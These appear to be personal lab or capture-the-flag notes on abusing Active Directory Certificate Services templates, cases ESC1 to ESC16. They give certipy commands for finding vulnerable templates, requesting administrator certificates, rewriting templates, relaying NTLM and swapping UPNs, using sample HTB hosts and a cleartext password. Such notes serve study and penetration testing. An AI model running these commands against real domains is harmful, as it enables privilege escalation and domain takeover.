
Certificate template exploitation is when a user can abuse a badly configured Windows certificate template to get a certificate that gives them more power than they should have.

Basically its a different authentication method in the domain its like a wrapper around kerberos

Certificate Authority (CA) issues digital certificates, A certificate template is like a form that defines:

- Who can request a certificate
- What the certificate can be used for
- What permissions the certificate gives
- Whether it can represent another user



Enterprise Security Controls for AD CS abuse

- ESC1 → Certificate template allows a user to request a certificate for another identity (impersonation)
- ESC2 → Dangerous certificate template usage (any purpose / special EKU issues)
- ESC3 → Certificate agent abuse
- ESC4 → User can modify a certificate template
- ESC8 → NTLM relay against certificate enrollment


```sh

#install 
pip install certipy

#Usage
#find which cert template are there
certipy find -u CURRENT_USER -p  CURRENT_PASSWORD -dc-ip IP

#find Vulnerable
certipy find -u ca_svc -p "password123" -dc-ip 10.129.45.247 -vulnerable -stdout

#Request a certficate 
certipy req -username ca_svc@sequel.htb -p 'Password123!!' -ca sequel-DC01-CA -
template DunderMifflinAuthentication -target dc01.sequel.htb -upn administrator@sequel.htb

#use certificate to authetnicate hence obtain an NT hash
certipy auth -pfx administrator.pfx -domain sequel.htb

#wrote the template's settings. It flipped `Enrollee Supplies Subject` to True
certipy template  -u ca_svc -p 'password123' -dc-ip 10.129.232.128   -template DunderMifflinAuthentication   -save-configuration DunderMifflin.json   -write-default-configuration


#abuse esc1
#add computuer  or obhject that has the enrolment rights
#use that to ask for a certificate and abuse it to impersonate someone 
#Enabled
#Client Authentication = True → cert can log in
#Enrollee Supplies Subject = True  → you pick the subject
#Enrollment Rights → Domain Users → you can enroll
#Requires Manager Approval = False, Authorized Signatures = 0
```

---
**structure of the template** 

 Enrollment Permissions -> These determine **who is allowed to request (generate) a certificate** from this template.
 
Object Control Permissions -> These determine **who can modify the template itself**.

- `Enrollee Supplies Subject : False` — the template won't let you inject a SAN, so `-upn`/`-dns` are ignored.

- `Certificate Name Flag : SubjectAltRequireDns` — the CA insists on putting a DNS name in the SAN, derived from the authenticating account.

--- 

 **ESC1** = enrollable template + `Enrollee Supplies Subject` + `Client Authentication`. An eligible enroller requests a cert and sets the **UPN in the SAN** to a target account (e.g. administrator). The CA issues it; you authenticate via PKINIT as that account.
 
`certipy req -u you -p pass -ca CA -template VulnTemplate -upn administrator@domain -dns dc.domain`

**ESC2** — Template has the Any Purpose EKU (or no EKU restriction at all). "Any Purpose" includes client auth, so the cert works for login. Exploit like ESC1 if it also allows SAN; otherwise chain it.

**ESC3** — Template grants the Certificate Request Agent EKU (enrollment agent). You enroll an agent cert, then use it to request a cert _on behalf of_ someone else.  
Step 1: `certipy req ... -template EnrollmentAgentTemplate` → agent.pfx  
Step 2: `certipy req ... -template User -on-behalf-of 'domain\administrator' -pfx agent.pfx`

**ESC4** — You have write access over a template (the one you just did). Rewrite it into an ESC1 template, exploit, restore.  
`certipy template ... -write-default-configuration` → then run ESC1 → then restore from your saved JSON.

**Access-control on the CA infrastructure**

**ESC5** — Write/control over CA-related AD objects (the CA computer object, PKI containers, the `NTAuthCertificates` object, etc.). Broader than ESC4 — you compromise the PKI's supporting objects rather than one template. Exploit depends on which object; goal is to control what the CA trusts.

**ESC7** — You hold ManageCA or ManageCertificates rights on the CA. With ManageCA you can flip the CA's EDITF flag (turns the whole CA into ESC6), or grant yourself officer rights and approve your own pending requests.  
`certipy ca -ca CA -add-officer you` / enable the SAN flag / approve a request.

**CA-configuration flaws**

**ESC6** — The CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` set, meaning it honors an attacker-supplied SAN on **any** template, even ones that normally forbid it. Request any client-auth template with `-upn administrator`. (Note: the May 2022 patch weakened this on its own — often needs pairing with weak mapping now.)

**ESC8** — CA has HTTP web enrollment with no HTTPS/EPA → NTLM relay. You coerce a machine (PetitPotam/PrinterBug) to authenticate, relay that to the CA's web endpoint, and get a cert for that machine  classically the DC's machine account.  
`certipy relay -target http://CA` + a coercion tool.

**ESC11** — Same idea as ESC8 but against the CA's **RPC** enrollment interface when encryption isn't enforced. Relay NTLM to the RPC endpoint instead of HTTP.

**Certificate-mapping / SID-binding flaws (the "post-2022 patch" family)**

These abuse how the DC maps a cert back to an account. Since May 2022, certs are supposed to carry a SID extension for strong binding. These ESCs exist where that binding is missing or weak.

**ESC9** — Template has `CT_FLAG_NO_SECURITY_EXTENSION`, so its certs lack the SID binding. If you also have write over a victim account, set the victim's UPN to `administrator`, enroll (no SID = maps by UPN), revert the UPN, then authenticate as admin.  
`certipy account update -user victim -upn administrator` → enroll → revert.

**ESC10** — Same outcome, but the weakness is on the **DC** itself (registry: weak `CertificateMappingMethods` or `StrongCertificateBindingEnforcement=0`). UPN manipulation → authenticate.

**ESC16** — The big one: the CA has the SID security extension globally disabled (OID `1.3.6.1.4.1.311.25.2` in the disabled-extensions list). This weakens the certificate-to-account binding domain-wide and allows legacy UPN/SAN mappings to be used for authentication. So _every_ cert is ESC9-like. Combine with a UPN swap to impersonate.  
Update the victim's userPrincipalName to the target (e.g. administrator), request the cert, then revert the UPN. [Medium](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)[Medium](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)

**ESC14** — Abuse of explicit mappings (`altSecurityIdentities`). If you can write that attribute on a victim, you map your own cert to them and authenticate as them.

**Newer**

**ESC13** — Template has an issuance policy linked to a privileged AD group (`msDS-OIDToGroupLink`). Just enrolling the template hands you a cert that grants that group's membership on login. No SAN trick needed — the group link does the work.

**ESC15 (EKUwu)** — Schema v1 templates don't enforce EKUs, so you inject your own application policy into the request. Take a template like WebServer and smuggle in a client-auth policy.  
`certipy req ... -template WebServer -application-policies 'Client Authentication' -upn administrator`

**ESC12** — CA private key sits on a YubiHSM with an exposed/default PIN. If you get a shell on the CA, extract the key and forge golden certificates (sign anything yourself, forever). Requires host access, so it's persistence-tier, not initial privesc.
